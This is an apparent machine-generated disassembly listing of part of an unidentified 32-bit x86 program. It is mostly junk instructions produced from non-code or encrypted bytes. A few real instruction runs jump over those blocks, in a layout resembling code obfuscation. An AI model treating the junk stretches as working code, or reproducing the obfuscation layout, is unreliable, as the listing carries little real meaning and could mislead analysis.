  42d47b:	and    eax,0x6675900
  42d480:	cmp    ebp,DWORD PTR [ebp+0x6a4857d]
  42d486:	and    eax,0x8684e899
  42d48b:	mov    ds:0xb7aa0e18,al
  42d490:	ja     0x42d4a9
  42d492:	ja     0x42d418
  42d494:	sbb    al,0x66
  42d496:	jb     0x42d4c8
  42d498:	out    0xca,eax
  42d49a:	fs popf 
  42d49c:	sub    eax,0xb895a118
  42d4a1:	xor    ebp,DWORD PTR [edi+0x645cf3e1]
  42d4a7:	dec    DWORD PTR [ebp+0x54d08f74]
  42d4ad:	cs add edx,0xcc05046a
  42d4b4:	add    DWORD PTR [eax],eax
  42d4b6:	add    cl,ch
  42d4b8:	fild   DWORD PTR [eax]
  42d4ba:	add    BYTE PTR [eax],al
  42d4bc:	ret    0x8160
  42d4bf:	or     DWORD PTR [ebx-0x1c143517],esp
  42d4c5:	ins    BYTE PTR es:[edi],dx
  42d4c6:	pop    edi
  42d4c7:	mov    eax,ds:0x3805600c
  42d4cc:	gs sbb al,0x2
  42d4cf:	add    bl,al
  42d4d1:	add    BYTE PTR [eax],al
  42d4d3:	add    BYTE PTR [ebp+0x45224731],ch
  42d4d9:	jae    0x42d464
  42d4db:	or     eax,0x939ea568
  42d4e0:	push   esi
  42d4e1:	push   0x9e00e90b
  42d4e6:	xchg   esi,eax
  42d4e7:	clc    
  42d4e8:	or     al,0xe2
  42d4ea:	bound  ebx,QWORD PTR [edx+0x75]
  42d4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4ee:	adc    ecx,esp
  42d4f0:	mov    ch,0xc
  42d4f2:	push   0xfffffffb
  42d4f4:	push   ebp
  42d4f5:	dec    eax
  42d4f6:	jne    0x42d4a5
  42d4f8:	in     al,dx
  42d4f9:	mov    cl,0x62
  42d4fb:	add    al,0x5e
  42d4fd:	xchg   edi,eax
  42d4fe:	mov    eax,ds:0xff4f2bc3
  42d503:	dec    ebp
  42d504:	mov    ds,WORD PTR [edi-0x4778e3ce]
  42d50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d50b:	jle    0x42d4e5
  42d50d:	cmp    ch,BYTE PTR [ecx+0x7a]
  42d510:	out    dx,al
  42d511:	stos   BYTE PTR es:[edi],al
  42d512:	shl    BYTE PTR [ebp+0xa643cd6],cl
  42d518:	or     ch,BYTE PTR [ecx-0x30]
  42d51b:	mov    ds:0x9c2a9859,eax
  42d520:	mov    eax,ds:0xdc7e1f4
  42d525:	sub    eax,0x2939bd37
  42d52a:	das    
  42d52b:	nop
  42d52c:	jb     0x42d552
  42d52e:	mov    bh,0x38
  42d530:	enter  0xb78,0x5d
  42d534:	xor    BYTE PTR [edi-0x4f],dh
  42d537:	jmp    DWORD PTR [ecx-0x42]
  42d53a:	jae    0x42d4fb
  42d53c:	or     al,0x31
  42d53e:	out    dx,al
  42d53f:	lahf   
  42d540:	clc    
  42d541:	push   esi
  42d542:	xor    eax,0xe467464d
  42d547:	lods   al,BYTE PTR ds:[esi]
  42d548:	mov    eax,DWORD PTR [edi+0x57]
  42d54b:	xchg   edx,eax
  42d54c:	adc    DWORD PTR [esi],edx
  42d54e:	loope  0x42d50c
  42d550:	mov    ah,0x3d
  42d552:	mov    BYTE PTR [ebp+0x65],bl
  42d555:	mov    eax,ds:0x3201210b
  42d55a:	jge    0x42d4f4
  42d55c:	mov    al,0x97
  42d55e:	or     eax,0x4541dba4
  42d563:	jmp    0x42d583
  42d565:	popf   
  42d566:	or     ecx,DWORD PTR [ebp+0x74]
  42d569:	sbb    eax,0xfffffffe
  42d56c:	outs   dx,BYTE PTR ds:[esi]
  42d56d:	fldcw  WORD PTR ds:0x2ac8b804
  42d573:	inc    esi
  42d574:	jae    0x42d5b2
  42d576:	dec    si
  42d578:	imul   ebx,DWORD PTR [edi+edi*1-0x1c545c19],0x6b
  42d580:	loopne 0x42d547
  42d582:	imul   ebp,DWORD PTR [ebp-0x555cf4da],0xa591ea30
  42d58c:	jbe    0x42d578
  42d58e:	push   0xffffffc8
  42d590:	or     dl,BYTE PTR [eax-0x5961e9db]
  42d596:	push   cs
  42d597:	push   eax
  42d598:	jmp    0x42d678
  42d59d:	dec    edx
  42d59e:	in     al,0x96
  42d5a0:	scas   eax,DWORD PTR es:[edi]
  42d5a1:	mov    esi,0xb6e57bff
  42d5a6:	cmp    dh,BYTE PTR [edx-0x61]
  42d5a9:	jae    0x42d621
  42d5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5ac:	(bad)  
  42d5ad:	sub    BYTE PTR ds:0xc30002,bl
  42d5b3:	add    BYTE PTR [eax],al
  42d5b5:	fadd   QWORD PTR [ebx]
  42d5b7:	jb     0x42d5d2
  42d5b9:	cmc    
  42d5ba:	and    eax,0xc99ed1f9
  42d5bf:	(bad)  
  42d5c0:	clc    
  42d5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5c2:	ins    BYTE PTR es:[edi],dx
  42d5c3:	mov    al,ds:0x7aa31164
  42d5c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5c9:	(bad)  
  42d5ca:	in     eax,dx
  42d5cb:	pop    es
  42d5cc:	ficomp DWORD PTR [ebp+0x34fd0a6]
  42d5d2:	push   cs
  42d5d3:	push   edi
  42d5d4:	and    ebp,DWORD PTR [eax]
  42d5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5d7:	dec    ebp
  42d5d8:	mov    dh,0x83
  42d5da:	ins    DWORD PTR es:[edi],dx
  42d5db:	inc    edx
  42d5dc:	mov    cl,0xa8
  42d5de:	sub    DWORD PTR [eax+0x1d],0xffffffd5
  42d5e2:	rcr    DWORD PTR [eax],1
  42d5e4:	jg     0x42d57b
  42d5e6:	xchg   DWORD PTR [ebp-0x35066fd],edi
  42d5ec:	enter  0xefa,0x4b
  42d5f0:	mov    ss,WORD PTR [edi+0x5a]
  42d5f3:	inc    ebp
  42d5f4:	jge    0x42d646
  42d5f6:	into   
  42d5f7:	add    ebx,edx
  42d5f9:	jg     0x42d598
  42d5fb:	loopne 0x42d676
  42d5fd:	fdiv   QWORD PTR [ebp-0x19]
  42d600:	mov    esp,0xb1e911a2
  42d605:	xor    DWORD PTR [esi-0x62],eax
  42d608:	dec    ecx
  42d609:	jl     0x42d5c0
  42d60b:	jp     0x42d677
  42d60d:	aam    0x22
  42d60f:	fld    QWORD PTR [ecx-0x5e04bfee]
  42d615:	aam    0x56
  42d617:	jl     0x42d674
  42d619:	adc    DWORD PTR ds:0xd75ed06a,edi
  42d61f:	mov    dl,0xb4
  42d621:	cmc    
  42d622:	rol    BYTE PTR [ecx+0x251f2afb],0x52
  42d629:	pop    esp
  42d62a:	pop    ebx
  42d62b:	jg     0x42d625
  42d62d:	jmp    0x42d67c
  42d62f:	sub    bl,cl
  42d631:	ins    DWORD PTR es:[edi],dx
  42d632:	xchg   ebp,eax
  42d633:	dec    esi
  42d634:	inc    si
  42d636:	push   esi
  42d637:	loopne 0x42d62a
  42d639:	inc    ebx
  42d63a:	into   
  42d63b:	add    BYTE PTR [edi+0x3c5e298],dh
  42d641:	inc    ebx
  42d642:	xlat   BYTE PTR ds:[ebx]
  42d643:	xchg   edx,eax
  42d644:	mov    ebp,0xb776cf0e
  42d649:	into   
  42d64a:	push   es
  42d64b:	repnz sub edi,ebp
  42d64e:	sbb    esp,DWORD PTR [ebp+0x55]
  42d651:	je     0x42d63f
  42d653:	adc    cl,BYTE PTR [esi]
  42d655:	outs   dx,BYTE PTR ds:[esi]
  42d656:	enter  0xa9ec,0x71
  42d65a:	add    BYTE PTR [esi],0x83
  42d65d:	sub    ecx,esp
  42d65f:	mov    ebx,0x772825a3
  42d664:	(bad)  
  42d665:	jle    0x42d6a0
  42d667:	out    0x79,eax
  42d669:	pop    ss
  42d66a:	jle    0x42d649
  42d66c:	xchg   esp,eax
  42d66d:	adc    ecx,DWORD PTR [eax]
  42d66f:	mov    ds:0xbad183df,al
  42d674:	sub    bh,dl
  42d676:	fst    DWORD PTR [eax]
  42d678:	lea    eax,[esp+0x70]
  42d67c:	push   eax
  42d67d:	call   0x41d107
  42d682:	mov    eax,DWORD PTR [esp+0x68]
  42d686:	mov    eax,DWORD PTR [eax]
  42d688:	pop    edi
  42d689:	pop    esi
  42d68a:	pop    ebx
  42d68b:	mov    esp,ebp
  42d68d:	pop    ebp
  42d68e:	ret    0xc
  42d691:	push   ebp
  42d692:	mov    ebp,esp
  42d694:	sub    esp,0x4c
  42d697:	cmp    DWORD PTR ds:0x433568,0x0
  42d69e:	jle    0x42d6d1
  42d6a4:	jmp    0x42d6d1
  42d6a9:	push   0x82ef
  42d6ae:	push   DWORD PTR [ebp-0xc]
  42d6b1:	push   0x42ed60
  42d6b6:	push   DWORD PTR [ebp-0x20]
  42d6b9:	push   0x6608
  42d6be:	push   0x7edb
  42d6c3:	push   0x581d
  42d6c8:	push   DWORD PTR [ebp-0x24]
  42d6cb:	call   DWORD PTR ds:0x43c830
  42d6d1:	push   ebx
  42d6d2:	push   esi
  42d6d3:	push   edi
  42d6d4:	mov    DWORD PTR [ebp-0x20],0xebeb4fd3
  42d6db:	mov    eax,0xffffdedc
  42d6e0:	jmp    0x42d7bd
  42d6e5:	lea    esp,[edi]
  42d6e7:	pop    eax
  42d6e8:	fdivp  st(2),st
  42d6ea:	dec    DWORD PTR [edi-0x8b9bc89]
  42d6f0:	xor    esi,DWORD PTR [eax-0x36]
  42d6f3:	mov    ah,ah
  42d6f5:	jmp    0x42d714
  42d6f7:	add    al,BYTE PTR [eax]
  42d6f9:	rol    BYTE PTR [eax],0x0
  42d6fc:	add    BYTE PTR [edi],dh
  42d6fe:	leave  
  42d6ff:	into   
  42d700:	iret   
  42d701:	cmp    BYTE PTR [edx+ebx*2],cl
  42d704:	pop    edx
  42d705:	fiadd  WORD PTR [ecx-0x37]
  42d708:	add    ebp,ebx
  42d70a:	int    0x3d
  42d70c:	adc    DWORD PTR [edx+0x66f1846c],edx
  42d712:	das    
  42d713:	jge    0x42d78e
  42d715:	stos   DWORD PTR es:[edi],eax
  42d716:	mov    eax,DWORD PTR [ebp-0x22af5f5c]
  42d71c:	shr    cl,1
  42d71e:	add    eax,0xb89fcb54
  42d723:	cmp    eax,0x8b5fb162
  42d728:	adc    eax,DWORD PTR [edi]
  42d72a:	fcom   st(7)
  42d72c:	test   eax,0x2289ac17
  42d731:	push   ds
  42d732:	lods   al,BYTE PTR ds:[esi]
  42d733:	scas   al,BYTE PTR es:[edi]
  42d734:	scas   al,BYTE PTR es:[edi]
  42d735:	dec    edi
  42d736:	scas   eax,DWORD PTR es:[edi]
  42d737:	xor    eax,0x933c33f3
  42d73c:	js     0x42d6cf
  42d73e:	inc    ebx
  42d73f:	lds    ecx,FWORD PTR [ebx+0x62c141b4]
  42d745:	inc    edi
  42d746:	inc    edi
  42d747:	daa    
  42d748:	cmc    
  42d749:	sbb    BYTE PTR [ecx+0x25b30df2],ah
  42d74f:	jb     0x42d70a
  42d751:	(bad)  
  42d752:	cmp    cl,BYTE PTR [ecx]
  42d754:	mov    bl,BYTE PTR [eax-0x31]
  42d757:	mov    BYTE PTR [ebp-0x80],0x91
  42d75b:	in     al,0x6c
  42d75d:	pop    es
  42d75e:	xor    eax,0xdf4ef08b
  42d763:	mov    dl,0x3e
  42d765:	mov    eax,0x801c861d
  42d76a:	cmp    edx,DWORD PTR [edi-0x58]
  42d76d:	pop    ebp
  42d76e:	lea    ebx,[esi]
  42d770:	cmp    BYTE PTR [eax-0x7f],0x6d
  42d774:	mov    ecx,0xa463d8f1
  42d779:	scas   eax,DWORD PTR es:[edi]
  42d77a:	sbb    al,0x52
  42d77c:	iret   
  42d77d:	jmp    0xfaeaa762
  42d782:	int3   
  42d783:	pop    es
  42d784:	push   cs
  42d785:	pusha  
  42d786:	mov    bh,0x38
  42d789:	jge    0x42d70b
  42d78b:	test   DWORD PTR [ebx*8-0x7e0b2aa7],esp
  42d792:	test   BYTE PTR [edi+0x44],al
  42d795:	jae    0x42d75a
  42d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d798:	mov    bh,0x10
  42d79a:	shl    DWORD PTR [edx+ecx*2-0x5f],0xcd
  42d79f:	pushf  
  42d7a0:	scas   al,BYTE PTR es:[edi]
  42d7a1:	dec    ecx
  42d7a2:	lods   eax,DWORD PTR ds:[esi]
  42d7a3:	sbb    al,0x27
  42d7a5:	or     al,0x56
  42d7a7:	cmp    edi,DWORD PTR [edi+0x3e]
  42d7aa:	fwait
  42d7ab:	push   0x77
  42d7ad:	sbb    DWORD PTR [edx-0x2bfaa7aa],0x7b
  42d7b4:	jle    0x42d742
  42d7b6:	or     cl,dl
  42d7b8:	out    dx,al
  42d7b9:	fldcw  WORD PTR [ecx-0x4b]
  42d7bc:	test   eax,0xc7e44589
  42d7c1:	inc    ebp
  42d7c2:	call   0xec2e279b
  42d7c7:	or     DWORD PTR ds:0x433598,edi
  42d7cd:	jmp    0x42d8aa
  42d7d2:	and    ah,BYTE PTR [ecx]
  42d7d4:	push   esi
  42d7d5:	repnz push edi
  42d7d7:	mul    DWORD PTR [esi+0x62771cf1]
  42d7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7de:	xchg   edx,eax
  42d7df:	mov    dh,0xb9
  42d7e1:	je     0x42d78e
  42d7e3:	push   ds
  42d7e4:	add    al,BYTE PTR [eax]
  42d7e6:	rol    BYTE PTR [eax],0x0
  42d7e9:	add    ah,ah
  42d7eb:	dec    esp
  42d7ec:	fwait
  42d7ed:	sbb    BYTE PTR [ebx+0x57],dl
  42d7f0:	lock icebp 
  42d7f2:	je     0x42d85c
  42d7f4:	xlat   BYTE PTR ds:[ebx]
  42d7f5:	jbe    0x42d84a
  42d7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7f8:	dec    ebx
  42d7f9:	pop    ecx
  42d7fa:	inc    edi
  42d7fb:	(bad)  
  42d7fc:	ss sbb eax,0xd6882646
  42d802:	dec    edx
  42d803:	hlt    
  42d804:	mov    edi,0x81d585a7
  42d809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d80a:	cmc    
  42d80b:	and    esi,DWORD PTR [ebp+ebx*2+0x1b]
  42d80f:	jle    0x42d797
  42d811:	je     0x42d849
  42d813:	xchg   esp,eax
  42d814:	lahf   
  42d815:	sbb    BYTE PTR [edx-0x899104d],ah
  42d81b:	lahf   
  42d81c:	arpl   WORD PTR [ecx+0x13e3cdb9],ax
  42d822:	test   cl,ah
  42d824:	jle    0x42d88a
  42d826:	xchg   esi,eax
  42d827:	cmc    
  42d828:	retf   
  42d829:	pop    esi
  42d82a:	nop
  42d82b:	xor    al,0x55
  42d82d:	cmp    esp,DWORD PTR [edi+ebx*4-0x57]
  42d831:	fsub   QWORD PTR [esi+0x2ce8660e]
  42d837:	fldcw  WORD PTR [ebx+0x5a8341ad]
  42d83d:	fidivr DWORD PTR ds:0x808536e2
  42d843:	les    eax,FWORD PTR [ebx]
  42d845:	mov    WORD PTR [ebx-0x32],fs
  42d848:	fsub   st,st(3)
  42d84a:	ins    WORD PTR es:[edi],dx
  42d84c:	das    
  42d84d:	ffreep st(1)
  42d84f:	xchg   ebx,eax
  42d850:	jge    0x42d8ac
  42d852:	or     bp,dx
  42d855:	mov    eax,0x4930de2b
  42d85a:	test   BYTE PTR [esi],dh
  42d85c:	pop    ebx
  42d85d:	(bad)  
  42d85e:	mov    ds:0xe35387ad,eax
  42d863:	sbb    BYTE PTR [esi-0x24],ch
  42d866:	out    dx,al
  42d867:	pusha  
  42d868:	dec    edx
  42d869:	push   0x19
  42d86b:	cmp    al,0x9
  42d86d:	into   
  42d86e:	sub    ebp,DWORD PTR [eax]
  42d870:	xor    eax,0xf6be3c6e
  42d875:	sbb    al,0x18
  42d877:	iret   
  42d878:	call   0x3b110344
  42d87d:	pusha  
  42d87e:	adc    ebp,ebp
  42d880:	sahf   
  42d881:	mov    BYTE PTR [ebx-0x56],bh
  42d884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d885:	mov    ah,0xcc
  42d887:	ja     0x42d8b0
  42d889:	push   0xb33e7ac7
  42d88e:	jae    0x42d8ec
  42d890:	jne    0x42d8cb
  42d892:	mov    eax,0x4c471eff
  42d897:	aas    
  42d898:	and    DWORD PTR [eax-0x1c],edx
  42d89b:	add    al,BYTE PTR [edi-0x5b]
  42d89e:	(bad)  [esi+0x1]
  42d8a1:	js     0x42d890
  42d8a3:	push   esp
  42d8a4:	xor    eax,0x2a5c57f9
  42d8a9:	iret   
  42d8aa:	mov    DWORD PTR [ebp-0x14],eax
  42d8ad:	xor    DWORD PTR ds:0x4335b4,0x6104
  42d8b7:	jmp    0x42d994
  42d8bc:	add    bh,BYTE PTR [eax-0x1b]
  42d8bf:	sar    bh,1
  42d8c1:	fnsave [edi]
  42d8c3:	cli    
  42d8c4:	(bad)  
  42d8c5:	jecxz  0x42d92c
  42d8c7:	xor    esp,DWORD PTR [ebx+ecx*4]
  42d8ca:	xlat   BYTE PTR ds:[ebx]
  42d8cb:	in     al,0x6b
  42d8cd:	pop    ds
  42d8ce:	add    al,BYTE PTR [eax]
  42d8d0:	rol    BYTE PTR [eax],0x0
  42d8d3:	add    dh,cl
  42d8d5:	int    0x9b
  42d8d7:	js     0x42d85d
  42d8d9:	inc    edi
  42d8da:	jno    0x42d93e
  42d8dc:	jns    0x42d943
  42d8de:	loopne 0x42d957
  42d8e0:	in     al,0xa1
  42d8e2:	js     0x42d8fc
  42d8e4:	fcmovnu st,st(7)
  42d8e6:	clc    
  42d8e7:	out    dx,eax
  42d8e8:	ficom  DWORD PTR [edi+eax*8-0x15940b9]
  42d8ef:	cwde   
  42d8f0:	sar    ecx,cl
  42d8f2:	xor    eax,0x551acc71
  42d8f7:	rcr    BYTE PTR [edx-0x34],1
  42d8fa:	xchg   ebp,eax
  42d8fb:	arpl   WORD PTR [esi],ax
  42d8fd:	adc    eax,0xbeac93c3
  42d902:	stos   DWORD PTR es:[edi],eax
  42d903:	int    0xbe
  42d905:	xchg   esi,eax
  42d906:	movntq QWORD PTR [ecx],mm2
  42d909:	adc    ah,bh
  42d90b:	sub    BYTE PTR [ebp+0x121f20d9],al
  42d911:	adc    eax,0x24a7e514
  42d916:	sub    DWORD PTR [ebx+0x38],ebp
  42d919:	loope  0x42d8a7
  42d91b:	jp     0x42d981
  42d91d:	dec    ebx
  42d91e:	inc    ebp
  42d91f:	jns    0x42d8eb
  42d921:	xchg   BYTE PTR [ecx],dl
  42d923:	inc    ecx
  42d924:	xchg   edi,eax
  42d925:	jnp    0x42d923
  42d927:	xchg   edi,eax
  42d928:	out    dx,al
  42d929:	fs dec edi
  42d92b:	adc    ecx,edx
  42d92d:	repnz fisubr WORD PTR [esi-0x14]
  42d931:	scas   eax,DWORD PTR es:[edi]
  42d932:	dec    esp
  42d933:	jno    0x42d8fe
  42d935:	dec    ecx
  42d936:	xor    al,BYTE PTR [ecx]
  42d938:	adc    al,0xb7
  42d93a:	stc    
  42d93b:	shl    DWORD PTR [eax],cl
  42d93d:	jg     0x42d8eb
  42d93f:	push   cs
  42d940:	xchg   edx,eax
  42d941:	pop    edi
  42d942:	mov    ebx,0x14cb551f
  42d947:	sub    ch,BYTE PTR [eax+ebx*1-0x752fdcb2]
  42d94e:	sti    
  42d94f:	cmp    cl,dh
  42d951:	jb     0x42d984
  42d953:	in     al,dx
  42d954:	(bad)  
  42d955:	ja     0x42d9c3
  42d957:	bound  ebx,QWORD PTR [ebx-0x31]
  42d95a:	push   ecx
  42d95b:	and    DWORD PTR [ebp-0x22c1ec5e],0x2d
  42d962:	stos   DWORD PTR es:[edi],eax
  42d963:	iret   
  42d964:	gs mov ebp,0x7b099e70
  42d96a:	sbb    BYTE PTR [ebx-0x53bb21ef],dl
  42d970:	(bad)  
  42d971:	jl     0x42d94b
  42d973:	mov    cl,0x38
  42d975:	xchg   esp,eax
  42d976:	adc    al,0xbe
  42d978:	(bad)  
  42d97a:	sbb    eax,0x49d1327a
  42d97f:	daa    
  42d980:	fmul   QWORD PTR [esi]
  42d982:	sbb    BYTE PTR [esi+0x20f797d6],cl
  42d988:	jnp    0x42d983
  42d98a:	aaa    
  42d98b:	div    BYTE PTR [edi+0x7efe3c6a]
  42d991:	mov    bh,BYTE PTR ds:0x84d8b77
  42d997:	mov    esi,0x3e76
  42d99c:	add    DWORD PTR ds:0x433654,edx
  42d9a2:	mov    eax,esi
  42d9a4:	jmp    0x42da81
  42d9a9:	scas   al,BYTE PTR es:[edi]
  42d9aa:	mov    dl,0xc8
  42d9ac:	sub    ah,bl
  42d9ae:	jp     0x42d99e
  42d9b0:	mov    dh,0xee
  42d9b2:	cmp    eax,0xc5260d77
  42d9b7:	repnz sub esp,DWORD PTR [bx+si]
  42d9bb:	add    al,BYTE PTR [eax]
  42d9bd:	rol    BYTE PTR [eax],0x0
  42d9c0:	add    BYTE PTR [edi-0x6f],bh
  42d9c3:	(bad)  [esi]
  42d9c5:	daa    
  42d9c6:	or     DWORD PTR [ebx+0x1035cac8],0x3d
  42d9cd:	popa   
  42d9ce:	mov    al,ds:0xce9b7b3b
  42d9d3:	sub    bl,BYTE PTR [ebx-0x32b17f8c]
  42d9d9:	les    ebx,FWORD PTR [edx-0x43678ab1]
  42d9df:	retf   0x486b
  42d9e2:	mov    ch,0x8e
  42d9e4:	push   0x5c
  42d9e6:	push   cs
  42d9e7:	js     0x42d975
  42d9e9:	sub    eax,0xbe51691b
  42d9ee:	ja     0x42da0c
  42d9f0:	cmp    dh,al
  42d9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d9f3:	pop    ss
  42d9f4:	je     0x42da12
  42d9f6:	(bad)  
  42d9f7:	aad    0xb6
  42d9f9:	jmp    0x90b8:0x4a48e965
  42da00:	in     eax,dx
  42da01:	xor    DWORD PTR ds:[edi+0x53f263f1],ecx
  42da08:	mov    ebp,0x34d647c
  42da0d:	inc    ebx
  42da0e:	mov    bh,0x4a
  42da10:	(bad)  
  42da12:	test   BYTE PTR ds:0x509252c1,dh
  42da18:	sub    eax,0x6a2a4e9
  42da1d:	xchg   ecx,eax
  42da1e:	and    eax,0xe7b043dd
  42da23:	ss adc al,0x67
  42da26:	and    cl,0x91
  42da29:	jmp    0xaa93:0x67c0
  42da2f:	sti    
  42da30:	pop    edx
  42da31:	imul   cl
  42da33:	and    DWORD PTR [edi-0x28],esi
  42da36:	xor    DWORD PTR [ebp+0x4d],ebx
  42da39:	in     al,0x84
  42da3b:	dec    ebp
  42da3c:	loopne 0x42da2d
  42da3e:	pusha  
  42da3f:	add    DWORD PTR [ecx-0x53a9d36c],ecx
  42da45:	jno    0x42daad
  42da47:	pusha  
  42da48:	sti    
  42da49:	shl    DWORD PTR [ecx-0x55],cl
  42da4c:	std    
  42da4d:	inc    ebp
  42da4e:	add    al,0xd8
  42da50:	(bad)  
  42da51:	pop    ecx
  42da52:	jg     0x42dac7
  42da54:	mov    edi,DWORD PTR [edi+0x78]
  42da57:	imul   BYTE PTR [ebx+0x66844884]
  42da5d:	dec    edx
  42da5e:	fldcw  WORD PTR [edx+edi*1+0x63]
  42da62:	xor    ebx,ecx
  42da64:	sbb    ah,BYTE PTR [edx-0x44d29fe3]
  42da6a:	xor    DWORD PTR [esi],edx
  42da6c:	xchg   esi,eax
  42da6d:	mov    ebp,0x79c17799
  42da72:	sbb    ebx,eax
  42da74:	les    eax,FWORD PTR [eax+ebp*4]
  42da77:	call   0xc3185a36
  42da7c:	pop    ds
  42da7d:	inc    edx
  42da7e:	or     DWORD PTR [ecx+0x410366c7],edi
  42da84:	and    BYTE PTR [ebx],dh
  42da86:	retf   0x4d8b
  42da89:	or     BYTE PTR [ebx],cl
  42da8b:	adc    eax,0x433544
  42da90:	mov    cx,WORD PTR [ecx+0x20]
  42da94:	and    edx,DWORD PTR ds:0x43361c
  42da9a:	add    cx,0x76
  42da9e:	add    DWORD PTR ds:0x433608,0x5e5c
  42daa8:	mov    edx,0x100
  42daad:	jmp    0x42db8a
  42dab2:	mov    eax,ds:0x737571d3
  42dab7:	mul    DWORD PTR [ebp+0x1c9f5bd7]
  42dabd:	xchg   ebp,eax
  42dabe:	dec    BYTE PTR ds:0x20eb3309
  42dac4:	add    al,BYTE PTR [eax]
  42dac6:	rol    BYTE PTR [eax],0x0
  42dac9:	add    BYTE PTR [eax+eax*4+0x1c],al
  42dacd:	cli    
  42dace:	sbb    eax,0x4d478ff4
  42dad3:	mov    dl,0xa2
  42dad5:	shl    DWORD PTR [ecx-0x1b],1
  42dad8:	scas   eax,DWORD PTR es:[edi]
  42dad9:	add    eax,0xc5490ba4
  42dade:	das    
  42dadf:	sbb    cl,bh
  42dae1:	add    dl,BYTE PTR [ebx-0x5333fc38]
  42dae7:	jmp    0x6df91987
  42daec:	xor    ebp,ebp
  42daee:	add    al,0x6e
  42daf0:	push   esi
  42daf1:	mov    edx,0x337cf76a
  42daf6:	mov    WORD PTR [ebx+ebx*8-0x7e],gs
  42dafa:	cmp    eax,0x8d657057
  42daff:	sub    eax,0x3562d9c6
  42db04:	popf   
  42db05:	mov    esp,0xe152c18f
  42db0a:	xor    DWORD PTR [ebp+0x368aa4b6],esi
  42db10:	push   esp
  42db11:	(bad)  
  42db13:	aas    
  42db14:	mul    ah
  42db16:	jmp    0x117e:0x926fd597
  42db1d:	adc    eax,0x790b4de
  42db22:	dec    esp
  42db23:	adc    BYTE PTR [ebx-0x6aaaba18],dl
  42db29:	leave  
  42db2a:	fs out dx,eax
  42db2c:	and    edx,DWORD PTR ds:0x804db6dd
  42db32:	xchg   ebx,eax
  42db33:	xor    cl,ch
  42db35:	clc    
  42db36:	cwde   
  42db37:	mov    ebp,0x7d706e24
  42db3c:	inc    edx
  42db3d:	and    eax,0x6ca4acf4
  42db42:	push   cs
  42db43:	push   0x39823775
  42db48:	(bad)  
  42db49:	lods   al,BYTE PTR ds:[esi]
  42db4a:	mov    BYTE PTR [ebx],cl
  42db4c:	popa   
  42db4d:	mov    WORD PTR [edx+0x14],ss
  42db50:	pop    ebp
  42db51:	fucomi st,st(1)
  42db53:	pop    esp
  42db54:	mov    ch,0x3f
  42db56:	push   ecx
  42db57:	mov    dl,dl
  42db59:	push   ebx
  42db5a:	add    BYTE PTR [eax+edx*8-0x16ef19cb],cl
  42db61:	into   
  42db62:	mov    DWORD PTR [ebp-0x90343e0],esi
  42db68:	cmp    DWORD PTR [edx+eax*8],esp
  42db6b:	sbb    al,0x9f
  42db6d:	jmp    0x50a8175e
  42db72:	retf   
  42db73:	nop
  42db74:	out    dx,eax
  42db75:	in     al,0xcc
  42db77:	scas   al,BYTE PTR es:[edi]
  42db78:	and    edi,0x43
  42db7b:	xor    al,0x61
  42db7d:	or     eax,0x31f4e166
  42db82:	fcmovne st,st(0)
  42db84:	mov    DWORD PTR [ecx-0x41],0x665c19f8
  42db8b:	imul   ecx,edx
  42db8e:	xor    DWORD PTR ds:0x43365c,0x433560
  42db98:	movzx  eax,ax
  42db9b:	adc    DWORD PTR ds:0x4335b8,0x433588
  42dba5:	shr    eax,0x8
  42dba8:	inc    DWORD PTR ds:0x433530
  42dbae:	movzx  ecx,cx
  42dbb1:	or     DWORD PTR ds:0x433584,0x6eea
  42dbbb:	or     ecx,eax
  42dbbd:	and    DWORD PTR ds:0x4335d0,ecx
  42dbc3:	mov    DWORD PTR [ebp-0x4],ecx
  42dbc6:	mov    eax,DWORD PTR [ebp-0x18]
  42dbc9:	not    ecx
  42dbcb:	mov    ecx,DWORD PTR [ebp-0x14]
  42dbce:	jmp    0x42dcab
  42dbd3:	fnstenv [ecx-0x9778b8]
  42dbd9:	(bad)  
  42dbdb:	dec    edx
  42dbdc:	dec    eax
  42dbdd:	rcr    dl,cl
  42dbdf:	aas    
  42dbe0:	push   esp
  42dbe1:	dec    esi
  42dbe2:	imul   ebp,DWORD PTR [ebx-0x3ffffddf],0xeb000000
  42dbec:	mov    bl,cl
  42dbee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbef:	outs   dx,DWORD PTR ds:[esi]
  42dbf0:	(bad)
  42dbf5:	cmp    BYTE PTR [ecx],bl
  42dbf7:	je     0x42dbd7
  42dbf9:	sub    DWORD PTR [eax-0x31],esi
  42dbfc:	scas   eax,DWORD PTR es:[edi]
  42dbfd:	add    bh,BYTE PTR [esi]
  42dbff:	mov    eax,0x82b577fa
  42dc04:	outs   dx,DWORD PTR ds:[esi]
  42dc05:	fbld   TBYTE PTR [esp+edx*8+0x68c9224e]
  42dc0c:	dec    ebp
  42dc0d:	inc    ecx
  42dc0e:	pop    ss
  42dc0f:	xor    BYTE PTR [eax],cl
  42dc11:	cmp    cl,bh
  42dc13:	inc    edx
  42dc14:	inc    ebp
  42dc15:	jmp    0x39a2:0x9ce234fb
  42dc1c:	push   edx
  42dc1d:	add    al,0x32
  42dc1f:	xor    eax,0xfcc57b09
  42dc24:	xchg   edi,eax
  42dc25:	fist   WORD PTR [esi]
  42dc27:	xchg   esp,eax
  42dc28:	cmp    DWORD PTR [ebx-0x4e7a0510],esp
  42dc2e:	hlt    
  42dc2f:	push   es
  42dc30:	dec    esi
  42dc31:	mov    ds:0xba7cf93a,eax
  42dc36:	mov    ah,0xa2
  42dc38:	int    0x21
  42dc3a:	nop
  42dc3b:	push   es
  42dc3c:	arpl   ax,sp
  42dc3e:	test   BYTE PTR [edi-0x45],bh
  42dc41:	sub    al,0xd2
  42dc43:	(bad)  
  42dc44:	aaa    
  42dc45:	enter  0x661f,0xde
  42dc49:	popf   
  42dc4a:	push   ebx
